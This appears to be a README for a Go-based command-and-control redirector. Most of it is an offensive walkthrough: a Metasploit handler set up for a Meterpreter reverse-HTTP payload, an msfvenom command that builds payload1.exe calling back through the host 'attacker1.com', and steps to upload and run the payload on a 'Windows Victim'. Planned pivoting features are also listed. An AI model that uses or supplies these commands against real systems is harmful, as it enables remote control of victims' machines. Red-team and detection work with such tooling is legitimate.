# Multiplexer C2

* A redirector built using golang

## Example:

* Metasploit
```
$ sudo msfdb init && msfconsole
[sudo] password for kali: 
[+] Starting database
[i] The database appears to be already configured, skipping initialization
Metasploit tip: Search can apply complex filters such as search cve:2009 
type:exploit, see all the filters with help search
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set LHOST 0.0.0.0                                                                            
LHOST => 0.0.0.0                                                                                                           

msf6 exploit(multi/handler) > set LPORT 10080                                                                              
LPORT => 10080

msf6 exploit(multi/handler) > set payload windows/meterpreter_reverse_http
payload => windows/meterpreter_reverse_http

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
```

* msfvenom - Set the host IP of your redirector
```
└─$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.2.10 LPORT=80 HttpHostHeader=attacker1.com -f exe -o payload1.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 177286 bytes
Final size of exe file: 252416 bytes
Saved as: payload1.exe
```

* Upload the payload to windows
* Run your golang program
* Execute the Windows payload

```

                            +--------------------+
                            |                    |
                            |   Windows Victim   |
                            |                    |
                            +--------------------+
                                    |
                                    |
           +-----------HTTP---------+
           |
           |
           \/
+---------------------+                             +---------------------+
|                     |                             |                     |
|  Golang Redirector  |------------HTTP------------>|  Metasploit server  |
|                     |                             |                     |
+---------------------+                             +---------------------+

```

## Next Steps

* Currently we hardcode the C2 ip address, need to make the hostname and port as a user argument.
* Need to add a userinput flag for more redirectors. Great for pivoting.
* Dockerize this. Makes it easier for portability, and if done with docker scratch, exploited containers deemed useless.
* Https and TCP - Need options to route over an https, http, tls, and mtls connections.